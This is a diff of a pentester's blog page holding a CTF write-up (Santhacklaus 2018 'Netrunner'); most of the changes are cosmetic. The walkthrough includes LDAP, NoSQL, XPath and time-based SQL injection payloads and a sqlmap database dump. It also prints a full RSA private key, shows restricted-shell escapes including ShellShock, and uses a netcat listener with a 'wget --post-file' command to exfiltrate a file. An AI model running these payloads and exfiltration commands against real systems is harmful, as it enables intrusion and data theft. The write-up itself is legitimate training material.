@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.62.0" />
+<meta name="generator" content="Hugo 0.72.0" />
 
   <meta property="og:title" content="[CTF - Santhacklaus-2018] Netrunner" />
 <meta property="og:description" content="" />
@@ -37,6 +37,7 @@
   <link href="//use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet">
   <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
   <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@500&display=swap" rel="stylesheet">
 
   
   <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
@@ -105,17 +106,17 @@
     <h1 class="brand-title">Thibaud Robin</h1>
     <h2 class="brand-tagline">Alias Th1b4ud</h2>
     <h2 class="brand-tagline">PENTESTER</h2>
-    <p>Personnal blog to speak about cybersecurity, technology and much more !</p>
+    <p>Personnal blog to speak about cybersecurity and Root-Me FAQ</p>
 
     <nav class="nav">
       <ul class="nav-list">
-        <li class="nav-item"><span class="nav-item-separator">//</span><a href="/">Home</a></li>
+        <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/">Home</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/whoami">WHOAMI</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/whoami">WHOAMI</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/writeups">WRITEUPS</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/writeups">WRITEUPS</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/articles">ARTICLES</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/articles">ARTICLES</a></li>
         
       </ul>
     </nav>
@@ -219,15 +220,15 @@
 
 			
 
-            <p>Netrunner is the second biggest challenge of the Santhacklaus 2018 CTF. The challenge is not really hard, but could be particulary annoying if you don't know what to do. You need to have some skills in pentest web and medium skills in Linux system.</p>
-<p>The challenge is divided in 3 steps. Each step has its own validation password (flag). So let's begin with the first step !</p>
+            <p>Netrunner is the second biggest challenge of the Santhacklaus 2018 CTF. The challenge is not really hard, but could be particulary annoying if you don&rsquo;t know what to do. You need to have some skills in pentest web and medium skills in Linux system.</p>
+<p>The challenge is divided in 3 steps. Each step has its own validation password (flag). So let&rsquo;s begin with the first step !</p>
 <p><img src="/img/santhacklaus/netrunner1.png" alt="" title=""></p>
 <h2 id="1st-step---you-have-a-mission-">1st step - You have a mission !</h2>
 <p><img src="/img/santhacklaus/netrunner2.png" alt="" title=""></p>
-<p>Well received ! Mission accepted, let's save the world !
-Fire your favorite web browser and navigate to <a href="http://santhacklaus.xyz:2077/">http://santhacklaus.xyz:2077/</a></p>
+<p>Well received ! Mission accepted, let&rsquo;s save the world !
+Fire your favorite web browser and navigate to <a href="http://santhacklaus.xyz">http://santhacklaus.xyz</a>:2077/</p>
 <p><img src="/img/santhacklaus/netrunner3.png" alt="" title=""></p>
-<p>Humm authentication page. Let's inspect that.</p>
+<p>Humm authentication page. Let&rsquo;s inspect that.</p>
 <div class="alert protips">
     <i class="logo fas fa-hand-holding-heart"></i>
     <p class="text"><strong>ProTips</strong> : When you do web pentesting, you must have a proxy who intercept request to inspect and replay it. I recommend you to use Burp with the browser extension FoxyProxy to switch rapidly between all yours proxys. 
@@ -236,7 +237,7 @@ Fire your favorite web browser and navigate to <a href="http://santhacklaus.xyz:
 </div>
 <p>So open Burp to do traffic interception. Submit something in the form and send the request to repeater section in Burp.</p>
 <p><img src="/img/santhacklaus/netrunner4.png" alt="" title=""></p>
-<p>Ok that's better ! So what can we see ?</p>
+<p>Ok that&rsquo;s better ! So what can we see ?</p>
 <ul>
 <li>The form send credentials to <code>/zetatech-admin.php</code> for checking.</li>
 <li>Server is running Nginx web server</li>
@@ -253,7 +254,7 @@ Fire your favorite web browser and navigate to <a href="http://santhacklaus.xyz:
 <h3 id="test-for-ldap-injection">Test for LDAP Injection</h3>
 <p>First, try if the application is vulerable to LDAP injection with the help of owasp guide
 If an application uses LDAP in its user authentication process, and is vulnerable to LDAP injection, it can be bypassed by injecting an LDAP query that will always be true (similar to SQL and XPATH injections).</p>
-<p>Let's assume that a web application uses a filter to do the LDAP user / password mapping.</p>
+<p>Let&rsquo;s assume that a web application uses a filter to do the LDAP user / password mapping.</p>
 <p><code>searchlogin = &quot;(&amp;(USER = &quot; + user_name + &quot;) (PASSWORD = &quot; + user_password + &quot;))&quot;;</code></p>
 <p>Using the following values:</p>
 <pre><code>user = johnDoe)(&amp;)
@@ -261,12 +262,12 @@ pass = password
 </code></pre><p>The search filter becomes:</p>
 <p><code>searchlogin = &quot;(&amp;(USER = johnDoe)(&amp;))(PASSWORD = pass))&quot;</code></p>
 <p>Only the first portion of this query is processed by the LDAP server <code>(&amp;(USER = johnDoe)(&amp;)</code> which always evaluates to true allowing the attacker to gain access to the system without needing to provide valid user credentials.</p>
-<p>Thanks wikipédia ! Let's try this. Here is an example of what you can try.</p>
+<p>Thanks wikipédia ! Let&rsquo;s try this. Here is an example of what you can try.</p>
 <p><img src="/img/santhacklaus/netrunner5.png" alt="" title=""></p>
-<p>Humm not seem effective. Let's try an other injection.</p>
+<p>Humm not seem effective. Let&rsquo;s try an other injection.</p>
 <h3 id="test-for-nosql-injection">Test for NoSQL Injection</h3>
 <p>NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits.</p>
-<p>It's really easy to detect. Look at the query below. The <code>[$ne]</code> string mean not equal. So the query mean : <strong><em>username not equal to th1b4ud and password not equal to p4sSw0rD</em></strong>. So the query will return true.</p>
+<p>It&rsquo;s really easy to detect. Look at the query below. The <code>[$ne]</code> string mean not equal. So the query mean : <strong><em>username not equal to th1b4ud and password not equal to p4sSw0rD</em></strong>. So the query will return true.</p>
 <p><code>username[$ne]=th1b4ud&amp;password[$ne]=p4sSw0rD</code></p>
 <p>Test this !</p>
 <p><img src="/img/santhacklaus/netrunner7.png" alt="" title=""></p>
@@ -278,12 +279,12 @@ pass = password
 <p>If the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the query result. For instance, the tester could input the following values:</p>
 <pre><code>Username: ' or '1' = '1 
 Password: ' or '1' = '1 
-</code></pre><p>Looks quite familiar, doesn't it? Using these parameters, the query becomes:</p>
+</code></pre><p>Looks quite familiar, doesn&rsquo;t it? Using these parameters, the query becomes:</p>
 <p><code>string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text()) </code></p>
 <p>As in a common SQL Injection attack, we have created a query that always evaluates to true, which means that the application will authenticate the user even if a username or a password have not been provided.</p>
-<p>So let's try this !</p>
+<p>So let&rsquo;s try this !</p>
 <p><img src="/img/santhacklaus/netrunner6.png" alt="" title=""></p>
-<p>Humm, maybe it's not XPath behind.</p>
+<p>Humm, maybe it&rsquo;s not XPath behind.</p>
 <h3 id="test-for-sql-injection">Test for SQL Injection</h3>
 <p>An SQL injection attack consists of insertion or &ldquo;injection&rdquo; of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. Maybe it will work (I hope !!!)</p>
 <p>Consider the following SQL query:</p>
@@ -302,11 +303,11 @@ $password = 1' or '1' = '1
 </div>
 <p>Look at my last protips. I speak about <code>SLEEP()</code> function to detect entry point. The function <code>SLEEP()</code> (in mysql and in others database engine) permit to stop the server for a while. We will exploit this functionnality to detect if an entry is vulnerable. The application run with php. I hope the database engine is MySql or an other engine who support <code>SLEEP()</code> function. We shall see !</p>
 <p>These query should do the trick :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">username=th1b4ud&amp;password=password&#39; OR SLEEP(3)#&amp;login=Login
-username=th1b4ud&#39; OR SLEEP(3)#&amp;password=password&amp;login=Login
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">username=th1b4ud<span style="color:#960050;background-color:#1e0010">&amp;</span>password=password&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1e0010">&amp;</span>login=Login
+username=th1b4ud&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1e0010">&amp;</span>password=password<span style="color:#960050;background-color:#1e0010">&amp;</span>login=Login
 </code></pre></div><p><img src="/img/santhacklaus/netrunner1.gif" alt="" title=""></p>
 <p><img src="https://media.giphy.com/media/WuGSL4LFUMQU/giphy.gif" alt="" title=""></p>
-<p>HOHO ! We found something ! We've got a sql injection vulnerability in the username ! Nice ! It's time to confirm that there is a mysql database behind the application.</p>
+<p>HOHO ! We found something ! We&rsquo;ve got a sql injection vulnerability in the username ! Nice ! It&rsquo;s time to confirm that there is a mysql database behind the application.</p>
 <div class="alert protips">
     <i class="logo fas fa-hand-holding-heart"></i>
     <p class="text"><strong>ProTips</strong> : You start to know me, I love to use cheatsheet. This on is nice to explore sql injection : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20injection 
@@ -314,7 +315,7 @@ username=th1b4ud&#39; OR SLEEP(3)#&amp;password=password&amp;login=Login
     </p>
 </div>
 <p><img src="/img/santhacklaus/netrunner2.gif" alt="" title=""></p>
-<p>Nice this is MySql. So I imagine the php code behind will do advanced check to avoid to pass throught with <code>' OR 1=1#</code> injection. But I think it's the good moment to show you how to use Sqlmap with time based sql injection.</p>
+<p>Nice this is MySql. So I imagine the php code behind will do advanced check to avoid to pass throught with <code>' OR 1=1#</code> injection. But I think it&rsquo;s the good moment to show you how to use Sqlmap with time based sql injection.</p>
 <p>This article speak well about time based injection : <a href="http://www.sqlinjection.net/time-based/">http://www.sqlinjection.net/time-based/</a></p>
 <div class="alert danger">
     <i class="logo fas fa-skull-crossbones"></i>
@@ -369,7 +370,7 @@ Table: access
 [15:15:35] [INFO] fetched data logged to text files under '/home/th1b4ud/.sqlmap/output/51.75.202.113'
 
 [*] shutting down at 15:15:35
-</code></pre><p>Ho finally ! We dump the database ! We've got two users : <code>admin</code> and <code>puppet-master</code>. Let's try a very simple injection with these informations.</p>
+</code></pre><p>Ho finally ! We dump the database ! We&rsquo;ve got two users : <code>admin</code> and <code>puppet-master</code>. Let&rsquo;s try a very simple injection with these informations.</p>
 <pre><code>admin'#
 puppet-master'#
 </code></pre><p>With admin</p>
@@ -380,7 +381,7 @@ puppet-master'#
 <p>OMG IT WORKS !</p>
 <h2 id="2nd-step---bypass-protection">2nd step - Bypass protection</h2>
 <p><img src="/img/santhacklaus/netrunner10.png" alt="" title=""></p>
-<p>We've got an access to the application. We now have an access to this page : <a href="http://santhacklaus.xyz:2077/e91ac60004c77904ad889a5762a68b06e53b7c21.html">http://santhacklaus.xyz:2077/e91ac60004c77904ad889a5762a68b06e53b7c21.html</a></p>
+<p>We&rsquo;ve got an access to the application. We now have an access to this page : <a href="http://santhacklaus.xyz">http://santhacklaus.xyz</a>:2077/e91ac60004c77904ad889a5762a68b06e53b7c21.html</p>
 <p>There is a private key.</p>
 <pre><code>-----BEGIN RSA PRIVATE KEY-----
 MIIJJwIBAAKCAgEA5nJEI+VHIE8eUE0Upf8eTGorOC5Cd0AVQGdgJLZPQNdcrgvu
@@ -478,7 +479,7 @@ ssh restricted@10.20.30.40 -t <span style="color:#e6db74">&#34;bash --noprofile&
 
 <span style="color:#75715e"># Try ShellShock on vulnerable shell implementations</span>
 ssh restricted@10.20.30.40 -t <span style="color:#e6db74">&#34;() { :; }; /bin/bash&#34;</span>
-</code></pre></div><p>Let's try this 3 commands</p>
+</code></pre></div><p>Let&rsquo;s try this 3 commands</p>
 <pre><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;/bin/sh&quot;
 
 [...]
@@ -554,7 +555,7 @@ drwxr-x--- 1 root puppet-master        4096 Dec 11 08:01 .ssh
 -rwxr----- 1 root puppet-master         439 Dec 10 13:52 client.note
 -rwxr-x--- 1 root puppet-master         746 Dec 10 13:52 status.sh
 -rwxr----- 1 root zetatech-maintenance  266 Dec 10 13:52 tech.note
-</code></pre><p>The file <code>tech.note</code> can be read by group <code>zetatech-maintenance</code>. This is the file we need ! Let's exfiltrate it !</p>
+</code></pre><p>The file <code>tech.note</code> can be read by group <code>zetatech-maintenance</code>. This is the file we need ! Let&rsquo;s exfiltrate it !</p>
 <p>First, launch my listener.</p>
 <pre><code>th1b4ud@pc-th1b4ud:~$ nc -lvp 4444
 listening on [any] 4444 ...
@@ -566,7 +567,7 @@ listening on [any] 4444 ...
  --post-file=file
       Use POST as the method for all HTTP requests and send the specified data in the request body.  --post-data
       sends string as data, whereas --post-file sends the contents of file.
-</code></pre><p>This is the option we need ! Let's execute <code>wget</code> with <code>zetatech-maintenance</code> group permission.</p>
+</code></pre><p>This is the option we need ! Let&rsquo;s execute <code>wget</code> with <code>zetatech-maintenance</code> group permission.</p>
 <pre><code>sudo -g zetatech-maintenance wget --post-file tech.note 12.34.56.78:4444
 </code></pre><p>Ho ! Something appeared on the listener !</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">connect to <span style="color:#f92672">[</span>192.168.0.50<span style="color:#f92672">]</span> from 113.ip-51-75-202.eu <span style="color:#f92672">[</span>51.75.202.113<span style="color:#f92672">]</span> <span style="color:#ae81ff">58604</span>
